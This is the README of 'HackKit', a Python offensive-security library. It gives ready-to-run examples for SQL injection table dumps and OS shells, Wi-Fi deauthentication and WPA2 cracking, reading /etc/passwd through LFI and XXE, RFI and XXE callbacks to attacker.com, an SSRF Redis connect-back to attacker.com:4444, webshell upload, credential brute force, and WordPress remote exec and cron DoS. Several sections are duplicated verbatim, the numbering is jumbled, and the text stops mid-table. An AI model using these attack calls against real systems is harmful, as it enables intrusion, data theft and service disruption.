# HackKit (continued)

**An amazing python library that includes a huge number of classes and components for implementing cyber attacks and penetration testing**, for example, classes for Wi-Fi, CSRF, LFI/RFI, SSTI, XXE, SSRF, file uploads, directory brute-force, auth bypass, header analysis, WordPress exploitation, WINDOWS, NETWORK, DOS, BluetoothHunter, Decode, RFIDWizard and more.
---

## Full Code by Mohammad Taha Gorji  
**GitHub:** [mr‑r0ot](https://github.com/mr-r0ot)

---

## 🔧 Installation

```bash
# (Recommended) Install via PyPI:
pip install HackKit
```

# Or from source:
git clone https://github.com/mr-r0ot/HackKit.git
cd HackKit
python setup.py install

    System Prerequisites:

        External tools: sqlmap, nmap, git, curl, aircrack-ng suite (Linux via apt)

        Python packages: requests, beautifulsoup4, tqdm, nmap3, bleak, scapy, etc.

📝 Quickstart
```
#pip install HackKit

from HackKit import *


```



---

## 📚 Module Reference

Below each class includes: **Platform support**, **Dependencies**, **Methods** table, detailed **Parameters**, **Return values**, **Raises**, and a **comprehensive usage example** covering all methods.

---

### 1. `SQLI`

**Platforms:** Linux, Windows
**Dependencies:** `sqlmap` CLI (installed via apt on Linux or GitHub ZIP on Windows)

#### Methods

| Method                                                                         | Signature                                                         | Description                                                                                                        |
| ------------------------------------------------------------------------------ | ----------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| `__init__()`                                                                   | `def __init__(self) -> None`                                      | Initialize; detects `platform.system()`, calls `automatic_dependency_checking()`.                                  |
| `automatic_dependency_checking()`                                              | `def automatic_dependency_checking(self) -> None`                 | Installs or downloads `sqlmap`. On Linux via `apt`; on Windows downloads ZIP, extracts, installs requirements.txt. |
| `execute_sqlmap(options: List[str])`                                           | `def execute_sqlmap(self, options: List[str]) -> None`            | Runs `sqlmap` with provided options list. Raises `CalledProcessError` on failure.                                  |
| `banner()`                                                                     | `def banner(self) -> None`                                        | Shows `sqlmap --version`.                                                                                          |
| `scan_url(url: str, level: int =1, risk:int=1)`                                | `def scan_url(self, url: str, level: int=1, risk: int=1) -> None` | Performs a basic scan.                                                                                             |
| `enumerate_databases(url: str)`                                                | `def enumerate_databases(self, url: str) -> None`                 | Lists databases.                                                                                                   |
| `enumerate_tables(url: str, db: str)`                                          | `def enumerate_tables(self, url: str, db: str) -> None`           | Lists tables in specified database.                                                                                |
| `dump_table(url: str, db: str, table: str, columns: Optional[List[str]]=None)` | ... -> None                                                       | Dumps full table or only given columns (comma-separated).                                                          |
| `os_shell(url: str)`                                                           | `def os_shell(self, url: str) -> None`                            | Drops an OS-level shell.                                                                                           |
| `sql_shell(url: str)`                                                          | `def sql_shell(self, url: str) -> None`                           | Opens interactive SQL shell.                                                                                       |

##### Example: SQLI Master Example

```python
from HackKit import SQLI

# Initialize
sqli = SQLI()
# Show banner
sqli.banner()
# Scan preparation
target = "http://example.com/vuln.php?id=1"
# 1) Basic scan
sqli.scan_url(target, level=2, risk=3)
# 2) List DBs
sqli.enumerate_databases(target)
# Assume 'users_db'
# 3) List tables
sqli.enumerate_tables(target, db="users_db")
# Assume 'users'
# 4) Dump only id and email
sqli.dump_table(target, db="users_db", table="users", columns=["id","email"])
# 5) Drop OS shell
# sqli.os_shell(target)
# 6) Drop SQL shell
# sqli.sql_shell(target)
```

---

### 2. `XSS`

**Platforms:** Linux, Windows
**Dependencies:** `git`, Python requirements.txt from XSStrike repo

#### Methods

| Method                                                                                      | Signature                                                | Description                                                           |
| ------------------------------------------------------------------------------------------- | -------------------------------------------------------- | --------------------------------------------------------------------- |
| `__init__()`                                                                                | `def __init__(self) -> None`                             | Detects platform, calls `automatic_dependency_checking()`.            |
| `automatic_dependency_checking()`                                                           | `def automatic_dependency_checking(self) -> None`        | Clones or pulls XSStrike repo; installs Python deps via pip.          |
| `execute_xsstrike(options: List[str])`                                                      | `def execute_xsstrike(self, options: List[str]) -> None` | Runs `xsstrike.py` with given options.                                |
| `banner()`                                                                                  | `def banner(self) -> None`                               | Shows help (usage).                                                   |
| `scan_url(url: str, blind: bool=False, crawl: bool=False, threads: int=5, timeout: int=10)` | ... -> None                                              | Scans one URL for reflected/stored/DOM XSS with optional blind/crawl. |
| `crawl_site(url: str, depth: int=2)`                                                        | `...`                                                    | Crawls and extracts parameters to feed into `scan_url`.               |
| `fuzz_parameters(url: str, param: Optional[str]=None)`                                      | ... -> None                                              | Fuzzes given parameter or all.                                        |
| `generate_report(url: str, output: str="xsstrike_report.html")`                             | ... -> None                                              | Runs scan and writes HTML report at given path.                       |

##### Example: XSS Master Example

```python
from HackKit import XSS

xss = XSS()
xss.banner()
site = "http://example.com/search?q=TEST"
# Full blind crawl
xss.scan_url(site, blind=True, crawl=True, threads=8, timeout=15)
# Crawl separately, then fuzz specific param
xss.crawl_site("http://example.com", depth=3)
xss.fuzz_parameters(site, param="q")
# Generate HTML report
xss.generate_report(site, output="example_xss_report.html")
```

---

### 3. `NETWORK`

**Platforms:** Linux (nmap CLI), Windows (`python3-nmap3`)
**Dependencies:** `nmap` or `python3-nmap3`

#### Methods

| Method                                                                                          | Signature                                         | Description                                 |
| ----------------------------------------------------------------------------------------------- | ------------------------------------------------- | ------------------------------------------- |
| `__init__()`                                                                                    | `def __init__(self) -> None`                      | Detects platform and installs dependencies. |
| `automatic_dependency_checking()`                                                               | `def automatic_dependency_checking(self) -> None` | Ensures `nmap` or `nmap3` installed.        |
| `ping_scan(targets: List[str], timeout: int=5) -> Dict[str, any]`                               | Ping scan hosts                                   |                                             |
| `port_scan(target: str, ports: str="1-1024", args: Optional[List[str]]=None) -> Dict[str, any]` | Scan ports                                        |                                             |
| `version_detection(target: str) -> Dict[str, any]`                                              | Service/version detection                         |                                             |
| `os_detection(target: str) -> Dict[str, any]`                                                   | OS fingerprinting                                 |                                             |
| `script_scan(target: str, scripts: List[str]) -> Dict[str, any]`                                | NSE script execution                              |                                             |
| `full_scan(target: str) -> Dict[str, any]`                                                      | All-in-one aggressive scan                        |                                             |

##### Example: NETWORK Master Example

```python
from HackKit import NETWORK

net = NETWORK()
# Ping scan
res1 = net.ping_scan(["192.168.1.1","192.168.1.2"], timeout=3)
print(res1)
# Port scan common ports
res2 = net.port_scan("192.168.1.1", ports="22,80,443")
print(res2)
# Version detect
res3 = net.version_detection("192.168.1.1")
# OS detect
res4 = net.os_detection("192.168.1.1")
# NSE script
res5 = net.script_scan("192.168.1.1", scripts=["http-vuln-cve2017-5638"])
# Full scan
res6 = net.full_scan("192.168.1.1")
```

---

### 4. `WIFI`

**Platforms:** Linux only
**Dependencies:** aircrack-ng suite (`iwconfig`, `airmon-ng`, etc.)

#### Methods

| Method                                                                                               | Signature                             | Description |
| ---------------------------------------------------------------------------------------------------- | ------------------------------------- | ----------- |
| `__init__(interface: Optional[str]=None)`                                                            | Set interface; installs missing tools |             |
| `automatic_dependency_checking()`                                                                    | Checks & installs all required tools  |             |
| `detect_interfaces() -> List[str]`                                                                   | Returns list of wireless interfaces   |             |
| `enable_monitor_mode(interface: str) -> None`                                                        | Enable monitor mode                   |             |
| `disable_monitor_mode(interface: Optional[str]=None) -> None`                                        | Disable monitor mode                  |             |
| `scan_access_points(interface: Optional[str]=None, timeout: int=15) -> List[Dict[str,str]]`          | Returns BSSID, CHANNEL, ESSID         |             |
| `deauth_attack(bssid: str, client_mac: Optional[str]=None, count: int=10) -> None`                   | Send deauth frames                    |             |
| `capture_handshake(bssid: str, output_file: str, timeout: int=60) -> None`                           | Capture WPA2 handshake                |             |
| `crack_wpa2(handshake_file: str, wordlist: str, output_file: str) -> None`                           | Crack handshake                       |             |
| `enumerate_clients(bssid: str, interface: Optional[str]=None) -> List[str]`                          | List connected clients                |             |
| `identify_device_technology(mac: str) -> Optional[str]`                                              | OUI vendor lookup                     |             |
| `wps_pin_attack(bssid: str, interface: Optional[str]=None, timeout: int=120) -> None`                | WPS PIN brute                         |             |
| `wps_pixie_dust(bssid: str, interface: Optional[str]=None, output_file: Optional[str]=None) -> None` | Pixie dust attack                     |             |
| `packet_injection_test(interface: Optional[str]=None) -> bool`                                       | Test injection capability             |             |

##### Example: WIFI Master Example

```python
from HackKit import WIFI

wifi = WIFI(interface="wlan0")
# Detect
ifaces = wifi.detect_interfaces()
print(ifaces)
iface = ifaces[0]
# Enable monitor
wifi.enable_monitor_mode(iface)
# Scan APs
aps = wifi.scan_access_points(timeout=10)
print(aps)
bssid = aps[0]['BSSID']
# Deauth one client
wifi.deauth_attack(bssid=bssid, count=5)
# Capture handshake
wifi.capture_handshake(bssid, output_file="hand.cap", timeout=60)
# Crack handshake
wifi.crack_wpa2("hand.cap","rockyou.txt","cracked.txt")
# Enumerate clients
clients = wifi.enumerate_clients(bssid)
print(clients)
# Packet injection test
print(wifi.packet_injection_test())
```

---

### 5. `CSRF`

**Platforms:** Cross-platform
**Dependencies:** `requests`, `beautifulsoup4`

#### Methods

| Method                                                                         | Signature                                         | Description                                      |
| ------------------------------------------------------------------------------ | ------------------------------------------------- | ------------------------------------------------ |
| `__init__()`                                                                   | `def __init__(self) -> None`                      | Imports and ensures `requests`, `BeautifulSoup`. |
| `automatic_dependency_checking()`                                              | Installs Python packages via pip if missing       |                                                  |
| `detect_csrf_tokens(url: str) -> List[Dict[str,str]]`                          | Extract hidden form inputs matching /csrf         | token/i                                          |
| `test_csrf_get(url: str, token_param: str) -> bool`                            | Return True if GET without valid token is blocked |                                                  |
| `test_csrf_post(url: str, form_data: Dict[str,str], token_param: str) -> bool` | POST analog                                       |                                                  |
| `generate_exploit_html(target_url: str, params: Dict[str,str]) -> str`         | Build auto-submitting HTML form                   |                                                  |
| `suggest_protection() -> str`                                                  | Returns best-practices string                     |                                                  |

##### Example: CSRF Master Example

```python
from HackKit import CSRF

csrf = CSRF()
url = "http://example.com/transfer"
# Detect tokens
tokens = csrf.detect_csrf_tokens(url)
print(tokens)
# Test GET
print(csrf.test_csrf_get(url, token_param=tokens[0]['name']))
# Test POST
print(csrf.test_csrf_post(url, form_data={"to":"victim","amount":"100"}, token_param=tokens[0]['name']))
# Generate exploit page
html = csrf.generate_exploit_html(url, params={"to":"victim","amount":"100", tokens[0]['name']:"INVALID"})
print(html)
# Suggest
print(csrf.suggest_protection())
```

---


### 6. `SQLI`

**Platforms:** Linux, Windows
**Dependencies:** `sqlmap` CLI (installed via apt on Linux or GitHub ZIP on Windows)

#### Methods

| Method                                                                         | Signature                                                         | Description                                                                                                        |
| ------------------------------------------------------------------------------ | ----------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| `__init__()`                                                                   | `def __init__(self) -> None`                                      | Initialize; detects `platform.system()`, calls `automatic_dependency_checking()`.                                  |
| `automatic_dependency_checking()`                                              | `def automatic_dependency_checking(self) -> None`                 | Installs or downloads `sqlmap`. On Linux via `apt`; on Windows downloads ZIP, extracts, installs requirements.txt. |
| `execute_sqlmap(options: List[str])`                                           | `def execute_sqlmap(self, options: List[str]) -> None`            | Runs `sqlmap` with provided options list. Raises `CalledProcessError` on failure.                                  |
| `banner()`                                                                     | `def banner(self) -> None`                                        | Shows `sqlmap --version`.                                                                                          |
| `scan_url(url: str, level: int =1, risk:int=1)`                                | `def scan_url(self, url: str, level: int=1, risk: int=1) -> None` | Performs a basic scan.                                                                                             |
| `enumerate_databases(url: str)`                                                | `def enumerate_databases(self, url: str) -> None`                 | Lists databases.                                                                                                   |
| `enumerate_tables(url: str, db: str)`                                          | `def enumerate_tables(self, url: str, db: str) -> None`           | Lists tables in specified database.                                                                                |
| `dump_table(url: str, db: str, table: str, columns: Optional[List[str]]=None)` | ... -> None                                                       | Dumps full table or only given columns (comma-separated).                                                          |
| `os_shell(url: str)`                                                           | `def os_shell(self, url: str) -> None`                            | Drops an OS-level shell.                                                                                           |
| `sql_shell(url: str)`                                                          | `def sql_shell(self, url: str) -> None`                           | Opens interactive SQL shell.                                                                                       |

##### Example: SQLI Master Example

```python
from HackKit import SQLI

# Initialize
sqli = SQLI()
# Show banner
sqli.banner()
# Scan preparation
target = "http://example.com/vuln.php?id=1"
# 1) Basic scan
sqli.scan_url(target, level=2, risk=3)
# 2) List DBs
sqli.enumerate_databases(target)
# Assume 'users_db'
# 3) List tables
sqli.enumerate_tables(target, db="users_db")
# Assume 'users'
# 4) Dump only id and email
sqli.dump_table(target, db="users_db", table="users", columns=["id","email"])
# 5) Drop OS shell
# sqli.os_shell(target)
# 6) Drop SQL shell
# sqli.sql_shell(target)
```

---

### 7. `XSS`

**Platforms:** Linux, Windows
**Dependencies:** `git`, Python requirements.txt from XSStrike repo

#### Methods

| Method                                                                                      | Signature                                                | Description                                                           |
| ------------------------------------------------------------------------------------------- | -------------------------------------------------------- | --------------------------------------------------------------------- |
| `__init__()`                                                                                | `def __init__(self) -> None`                             | Detects platform, calls `automatic_dependency_checking()`.            |
| `automatic_dependency_checking()`                                                           | `def automatic_dependency_checking(self) -> None`        | Clones or pulls XSStrike repo; installs Python deps via pip.          |
| `execute_xsstrike(options: List[str])`                                                      | `def execute_xsstrike(self, options: List[str]) -> None` | Runs `xsstrike.py` with given options.                                |
| `banner()`                                                                                  | `def banner(self) -> None`                               | Shows help (usage).                                                   |
| `scan_url(url: str, blind: bool=False, crawl: bool=False, threads: int=5, timeout: int=10)` | ... -> None                                              | Scans one URL for reflected/stored/DOM XSS with optional blind/crawl. |
| `crawl_site(url: str, depth: int=2)`                                                        | `...`                                                    | Crawls and extracts parameters to feed into `scan_url`.               |
| `fuzz_parameters(url: str, param: Optional[str]=None)`                                      | ... -> None                                              | Fuzzes given parameter or all.                                        |
| `generate_report(url: str, output: str="xsstrike_report.html")`                             | ... -> None                                              | Runs scan and writes HTML report at given path.                       |

##### Example: XSS Master Example

```python
from HackKit import XSS

xss = XSS()
xss.banner()
site = "http://example.com/search?q=TEST"
# Full blind crawl
xss.scan_url(site, blind=True, crawl=True, threads=8, timeout=15)
# Crawl separately, then fuzz specific param
xss.crawl_site("http://example.com", depth=3)
xss.fuzz_parameters(site, param="q")
# Generate HTML report
xss.generate_report(site, output="example_xss_report.html")
```

---

### 8. `NETWORK`

**Platforms:** Linux (nmap CLI), Windows (`python3-nmap3`)
**Dependencies:** `nmap` or `python3-nmap3`

#### Methods

| Method                                                                                          | Signature                                         | Description                                 |
| ----------------------------------------------------------------------------------------------- | ------------------------------------------------- | ------------------------------------------- |
| `__init__()`                                                                                    | `def __init__(self) -> None`                      | Detects platform and installs dependencies. |
| `automatic_dependency_checking()`                                                               | `def automatic_dependency_checking(self) -> None` | Ensures `nmap` or `nmap3` installed.        |
| `ping_scan(targets: List[str], timeout: int=5) -> Dict[str, any]`                               | Ping scan hosts                                   |                                             |
| `port_scan(target: str, ports: str="1-1024", args: Optional[List[str]]=None) -> Dict[str, any]` | Scan ports                                        |                                             |
| `version_detection(target: str) -> Dict[str, any]`                                              | Service/version detection                         |                                             |
| `os_detection(target: str) -> Dict[str, any]`                                                   | OS fingerprinting                                 |                                             |
| `script_scan(target: str, scripts: List[str]) -> Dict[str, any]`                                | NSE script execution                              |                                             |
| `full_scan(target: str) -> Dict[str, any]`                                                      | All-in-one aggressive scan                        |                                             |

##### Example: NETWORK Master Example

```python
from HackKit import NETWORK

net = NETWORK()
# Ping scan
res1 = net.ping_scan(["192.168.1.1","192.168.1.2"], timeout=3)
print(res1)
# Port scan common ports
res2 = net.port_scan("192.168.1.1", ports="22,80,443")
print(res2)
# Version detect
res3 = net.version_detection("192.168.1.1")
# OS detect
res4 = net.os_detection("192.168.1.1")
# NSE script
res5 = net.script_scan("192.168.1.1", scripts=["http-vuln-cve2017-5638"])
# Full scan
res6 = net.full_scan("192.168.1.1")
```

---

### 9. `WIFI`

**Platforms:** Linux only
**Dependencies:** aircrack-ng suite (`iwconfig`, `airmon-ng`, etc.)

#### Methods

| Method                                                                                               | Signature                             | Description |
| ---------------------------------------------------------------------------------------------------- | ------------------------------------- | ----------- |
| `__init__(interface: Optional[str]=None)`                                                            | Set interface; installs missing tools |             |
| `automatic_dependency_checking()`                                                                    | Checks & installs all required tools  |             |
| `detect_interfaces() -> List[str]`                                                                   | Returns list of wireless interfaces   |             |
| `enable_monitor_mode(interface: str) -> None`                                                        | Enable monitor mode                   |             |
| `disable_monitor_mode(interface: Optional[str]=None) -> None`                                        | Disable monitor mode                  |             |
| `scan_access_points(interface: Optional[str]=None, timeout: int=15) -> List[Dict[str,str]]`          | Returns BSSID, CHANNEL, ESSID         |             |
| `deauth_attack(bssid: str, client_mac: Optional[str]=None, count: int=10) -> None`                   | Send deauth frames                    |             |
| `capture_handshake(bssid: str, output_file: str, timeout: int=60) -> None`                           | Capture WPA2 handshake                |             |
| `crack_wpa2(handshake_file: str, wordlist: str, output_file: str) -> None`                           | Crack handshake                       |             |
| `enumerate_clients(bssid: str, interface: Optional[str]=None) -> List[str]`                          | List connected clients                |             |
| `identify_device_technology(mac: str) -> Optional[str]`                                              | OUI vendor lookup                     |             |
| `wps_pin_attack(bssid: str, interface: Optional[str]=None, timeout: int=120) -> None`                | WPS PIN brute                         |             |
| `wps_pixie_dust(bssid: str, interface: Optional[str]=None, output_file: Optional[str]=None) -> None` | Pixie dust attack                     |             |
| `packet_injection_test(interface: Optional[str]=None) -> bool`                                       | Test injection capability             |             |

##### Example: WIFI Master Example

```python
from HackKit import WIFI

wifi = WIFI(interface="wlan0")
# Detect
ifaces = wifi.detect_interfaces()
print(ifaces)
iface = ifaces[0]
# Enable monitor
wifi.enable_monitor_mode(iface)
# Scan APs
aps = wifi.scan_access_points(timeout=10)
print(aps)
bssid = aps[0]['BSSID']
# Deauth one client
wifi.deauth_attack(bssid=bssid, count=5)
# Capture handshake
wifi.capture_handshake(bssid, output_file="hand.cap", timeout=60)
# Crack handshake
wifi.crack_wpa2("hand.cap","rockyou.txt","cracked.txt")
# Enumerate clients
clients = wifi.enumerate_clients(bssid)
print(clients)
# Packet injection test
print(wifi.packet_injection_test())
```

---

### 10. `CSRF`

**Platforms:** Cross-platform
**Dependencies:** `requests`, `beautifulsoup4`

#### Methods

| Method                                                                         | Signature                                         | Description                                      |
| ------------------------------------------------------------------------------ | ------------------------------------------------- | ------------------------------------------------ |
| `__init__()`                                                                   | `def __init__(self) -> None`                      | Imports and ensures `requests`, `BeautifulSoup`. |
| `automatic_dependency_checking()`                                              | Installs Python packages via pip if missing       |                                                  |
| `detect_csrf_tokens(url: str) -> List[Dict[str,str]]`                          | Extract hidden form inputs matching /csrf         | token/i                                          |
| `test_csrf_get(url: str, token_param: str) -> bool`                            | Return True if GET without valid token is blocked |                                                  |
| `test_csrf_post(url: str, form_data: Dict[str,str], token_param: str) -> bool` | POST analog                                       |                                                  |
| `generate_exploit_html(target_url: str, params: Dict[str,str]) -> str`         | Build auto-submitting HTML form                   |                                                  |
| `suggest_protection() -> str`                                                  | Returns best-practices string                     |                                                  |

##### Example: CSRF Master Example

```python
from HackKit import CSRF

csrf = CSRF()
url = "http://example.com/transfer"
# Detect tokens
tokens = csrf.detect_csrf_tokens(url)
print(tokens)
# Test GET
print(csrf.test_csrf_get(url, token_param=tokens[0]['name']))
# Test POST
print(csrf.test_csrf_post(url, form_data={"to":"victim","amount":"100"}, token_param=tokens[0]['name']))
# Generate exploit page
html = csrf.generate_exploit_html(url, params={"to":"victim","amount":"100", tokens[0]['name']:"INVALID"})
print(html)
# Suggest
print(csrf.suggest_protection())
```

---

### 11. `LFI_RFI`

**Platforms:** Cross-platform
**Dependencies:** `requests`

#### Methods

| Method                                                                              | Signature                                                                  | Description                               |
| ----------------------------------------------------------------------------------- | -------------------------------------------------------------------------- | ----------------------------------------- |
| `__init__()`                                                                        | `def __init__(self) -> None`                                               | Imports and ensures `requests` available. |
| `automatic_dependency_checking()`                                                   | Installs `requests` if missing.                                            |                                           |
| `detect_lfi(url: str, param: str, payloads: Optional[List[str]]=None) -> List[str]` | Inject LFI payloads, return successful payloads.                           |                                           |
| `read_file(url: str, param: str, filepath: str) -> Optional[str]`                   | Read remote file via LFI, return content or None.                          |                                           |
| `test_rfi(url: str, param: str, remote_url: str) -> bool`                           | Test RFI by including external URL, return True if remote content appears. |                                           |

##### Example: LFI\_RFI Master Example

```python
from HackKit import LFI_RFI

lfi = LFI_RFI()
base = "http://vuln/page.php?file="
# 1) Detect LFI
payloads = lfi.detect_lfi(base + "user=1", param="file")
print("Successful payloads:", payloads)
# 2) Read /etc/passwd
content = lfi.read_file(base, param="file", filepath="../../../../etc/passwd")
print(content)
# 3) Test RFI (OOB)
is_rfi = lfi.test_rfi(base, param="file", remote_url="http://attacker.com/payload")
print("RFI possible?", is_rfi)
```

---

### 12. `SSTI`

**Platforms:** Cross-platform
**Dependencies:** `requests`

#### Methods

| Method                                                                                    | Signature                                          | Description                   |
| ----------------------------------------------------------------------------------------- | -------------------------------------------------- | ----------------------------- |
| `__init__()`                                                                              | `def __init__(self) -> None`                       | Ensures `requests` available. |
| `automatic_dependency_checking()`                                                         | Installs `requests` if missing.                    |                               |
| `detect_ssti(url: str, param: str, payloads: Optional[List[str]]=None) -> Dict[str,bool]` | Test SSTI payloads, return dict of payload->bool.  |                               |
| `exploit_ssti(url: str, param: str, template: str) -> Optional[str]`                      | Send custom template, return response text on 200. |                               |
| `get_interactive_shell(url: str, param: str) -> None`                                     | Print guidance for interactive SSTI shell usage.   |                               |

##### Example: SSTI Master Example

```python
from HackKit import SSTI

ssti = SSTI()
url = "http://vuln/render"
# 1) Detect SSTI
res = ssti.detect_ssti(url, param="template")
print(res)
# 2) Exploit with arithmetic
resp = ssti.exploit_ssti(url, param="template", template="{{7*7}}")
print(resp)
# 3) Interactive shell hint
ssti.get_interactive_shell(url, param="template")
```

---

### 13. `XXE`

**Platforms:** Cross-platform
**Dependencies:** `requests`

#### Methods

| Method                                                                                      | Signature                                       | Description                   |
| ------------------------------------------------------------------------------------------- | ----------------------------------------------- | ----------------------------- |
| `__init__()`                                                                                | `def __init__(self) -> None`                    | Ensures `requests` available. |
| `automatic_dependency_checking()`                                                           | Installs `requests` if missing.                 |                               |
| `test_xxe(endpoint: str, xml_payload: str, header: str='application/xml') -> Optional[str]` | Send XML payload, return response text on 200.  |                               |
| `generate_xxe_payload(filepath: str, identifier: str='xxe') -> str`                         | Build simple XXE payload reading local file.    |                               |
| `out_of_band_xxe(endpoint: str, oob_url: str) -> str`                                       | Generate OOB payload and send, return response. |                               |

##### Example: XXE Master Example

```python
from HackKit import XXE

xxe = XXE()
url = "http://vuln/xml"
# 1) Build payload
payload = xxe.generate_xxe_payload(filepath="/etc/passwd")
# 2) Send payload
resp = xxe.test_xxe(url, payload)
print(resp)
# 3) OOB payload
oob = xxe.out_of_band_xxe(url, oob_url="http://attacker.com/notify")
print(oob)
```

---

### 14. `SSRF`

**Platforms:** Cross-platform
**Dependencies:** `requests`, `tqdm`, `git`

#### Methods

| Method                                                                                                                                                                                                                                                                         | Signature                                                         | Description                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------- | ------------------------------------------------ |
| `__init__()`                                                                                                                                                                                                                                                                   | `def __init__(self) -> None`                                      | Clones/pulls SSRFmap repo; installs Python deps. |
| `automatic_dependency_checking()`                                                                                                                                                                                                                                              | Ensures `git`, clones or updates repo, installs requirements.txt. |                                                  |
| `execute(reqfile: str, param: str, modules: List[str], handler: Optional[int]=None, lhost: Optional[str]=None, lport: Optional[int]=None, uagent: Optional[str]=None, ssl: bool=False, proxy: Optional[str]=None, level: int=1, extra_args: Optional[List[str]]=None) -> None` | Run ssrfmap.py with given options.                                |                                                  |
| `module_readfiles(reqfile: str, param: str, rfiles: Optional[str]=None) -> None`                                                                                                                                                                                               | Convenience: file read module.                                    |                                                  |
| `module_portscan(reqfile: str, param: str) -> None`                                                                                                                                                                                                                            | Convenience: portscan module.                                     |                                                  |
| `module_redis(reqfile: str, param: str, lhost: str, lport: int, handler: int) -> None`                                                                                                                                                                                         | Convenience: Redis exploit module.                                |                                                  |
| `module_custom(reqfile: str, param: str, data: str, target_port: int) -> None`                                                                                                                                                                                                 | Convenience: send raw data to port.                               |                                                  |

##### Example: SSRF Master Example

```python
from HackKit import SSRF

ssrf = SSRF()
reqfile = "req.txt"  # Burp-formatted request file
param = "url"
# 1) Basic readfiles
ssrf.module_readfiles(reqfile, param, rfiles="/etc/passwd")
# 2) Port scan internal service
ssrf.module_portscan(reqfile, param)
# 3) Redis connect-back
ssrf.module_redis(reqfile, param, lhost="attacker.com", lport=4444, handler=4444)
# 4) Custom data send
ssrf.module_custom(reqfile, param, data="HELLO", target_port=1234)
```

---

### 29 `FileUpload`

**Platforms:** Cross-platform
**Dependencies:** `requests`, system `curl` on Linux

#### Methods

| Method                                                                                | Signature                                                        | Description                             |
| ------------------------------------------------------------------------------------- | ---------------------------------------------------------------- | --------------------------------------- |
| `__init__(upload_url: str, param: str='file')`                                        | `def __init__(self, upload_url: str, param: str='file') -> None` | Sets target URL & param; installs deps. |
| `automatic_dependency_checking()`                                                     | Installs `requests`; installs `curl` on Linux if missing.        |                                         |
| `detect_endpoint() -> bool`                                                           | `def detect_endpoint(self) -> bool`                              | Checks OPTIONS status code (200/204).   |
| `bypass_extension_check(file_path: str, trick: str='file.php;.jpg') -> Optional[str]` | Attempt rename trick; return server response if successful.      |                                         |
| `upload_webshell(shell_path: str) -> Optional[str]`                                   | Upload PHP webshell; return URL if found.                        |                                         |

##### Example: FileUpload Master Example

```python
from HackKit import FileUpload

fu = FileUpload(upload_url="http://site/upload")
# 1) Detect endpoint
print(fu.detect_endpoint())
# 2) Bypass ext
resp = fu.bypass_extension_check("shell.php", trick=";.php.jpg")
print(resp)
# 3) Upload webshell
url = fu.upload_webshell("shell.php")
print("Webshell URL:", url)
```

---

## 26. `DirBruteEnum`

**Platforms:** Cross-platform
**Dependencies:** `requests`, system `ffuf` on Linux

#### Methods

| Method                                                                     | Signature                                                    | Description                              |
| -------------------------------------------------------------------------- | ------------------------------------------------------------ | ---------------------------------------- |
| `__init__(base_url: str, wordlist: str='/usr/share/wordlists/common.txt')` | `def __init__(self, base_url: str, wordlist: str) -> None`   | Sets base URL & wordlist; installs deps. |
| `automatic_dependency_checking()`                                          | Installs `requests`, ensures `ffuf` on Linux.                |                                          |
| `brute(threads: int=50, extensions: List[str]=None) -> List[str]`          | Run ffuf, return discovered paths.                           |                                          |
| `recursive_enum(depth: int=2) -> List[str]`                                | Recursively brute up to `depth`, return list of directories. |                                          |

##### Example: DirBruteEnum Master Example

```python
from HackKit import DirBruteEnum

brute = DirBruteEnum(base_url="http://site/")
# 1) Single-level brute
dirs = brute.brute(threads=20, extensions=['.php','.html'])
print(dirs)
# 2) Recursive enum
all_dirs = brute.recursive_enum(depth=2)
print(all_dirs)
```

---

### 22. `AuthBypass`

**Platforms:** Cross-platform
**Dependencies:** `requests`

#### Methods

| Method                                                                   | Signature                                                  | Description                                                  |
| ------------------------------------------------------------------------ | ---------------------------------------------------------- | ------------------------------------------------------------ |
| `__init__(login_url: str, session=None)`                                 | `def __init__(self, login_url: str, session=None) -> None` | Sets login URL; uses provided or new Session; installs deps. |
| `automatic_dependency_checking()`                                        | Installs `requests` if missing.                            |                                                              |
| `test_default_credentials(creds: List[Dict[str,str]]) -> Dict[str,bool]` | Test list of user/pass, return dict user\:pass->bool.      |                                                              |
| `force_logout(logout_url: str) -> bool`                                  | Trigger logout, return True on 200.                        |                                                              |
| `test_privilege_escalation(normal_url: str, admin_url: str) -> bool`     | Check if normal user can access admin page.                |                                                              |

##### Example: AuthBypass Master Example

```python
from HackKit import AuthBypass

ab = AuthBypass(login_url="http://site/login")
creds = [{'user':'admin','pass':'1234'},{'user':'root','pass':'toor'}]
# 1) Test defaults
print(ab.test_default_credentials(creds))
# 2) Force logout
print(ab.force_logout("http://site/logout"))
# 3) Privilege escalation test
print(ab.test_privilege_escalation("http://site/profile","http://site/admin"))
```

---

### 27. `Headers`

**Platforms:** Cross-platform
**Dependencies:** `requests`

#### Methods

| Method                                                                 | Signature                                                        | Description                     |
| ---------------------------------------------------------------------- | ---------------------------------------------------------------- | ------------------------------- |
| `__init__(url: str)`                                                   | `def __init__(self, url: str) -> None`                           | Sets target URL; installs deps. |
| `automatic_dependency_checking()`                                      | Installs `requests` if missing.                                  |                                 |
| `scan_security_headers() -> Dict[str,Optional[str]]`                   | Return dict header->value or None for standard security headers. |                                 |
| `suggest_hardening(headers: Dict[str,Optional[str]]) -> Dict[str,str]` | Return advice for missing headers.                               |                                 |

##### Example: Headers Master Example

```python
from HackKit import Headers

h = Headers(url="http://site")
# 1) Scan
hdrs = h.scan_security_headers()
print(hdrs)
# 2) Suggest hardening
print(h.suggest_hardening(hdrs))
```

---

### 28. `WordPress`

**Platforms:** Linux (`wpscan`), Windows (HTTP checks)
**Dependencies:** `requests`, `wpscan` on Linux

#### Methods

| Method                                                                            | Signature                                             | Description                                         |
| --------------------------------------------------------------------------------- | ----------------------------------------------------- | --------------------------------------------------- |
| `__init__(target: str)`                                                           | `def __init__(self, target: str) -> None`             | Sets target; ensures `requests`, `wpscan` if Linux. |
| `_ensure_deps()`                                                                  | Installs `requests`; installs `wpscan` on Linux.      |                                                     |
| `scan() -> Dict[str,Any]`                                                         | Run WPScan JSON or HTTP checks; return findings dict. |                                                     |
| `exploit_pingback(src: str, tgt: str) -> str`                                     | Pingback ping exploit; return response.               |                                                     |
| `exploit_exec(cmd: str) -> str`                                                   | XMLRPC system.exec; return output.                    |                                                     |
| `exploit_bruteforce(user_list: List[str], pass_list: List[str]) -> Dict[str,str]` | Try creds; return successful dict.                    |                                                     |
| `exploit_cron_dos(threads: int=100, duration: int=30) -> None`                    | Flood wp-cron for DoS.                                |                                                     |
| `exploit_download_backup(remote_path: str, local_filename: str) -> bool`          | Download backup file.                                 |                                                     |
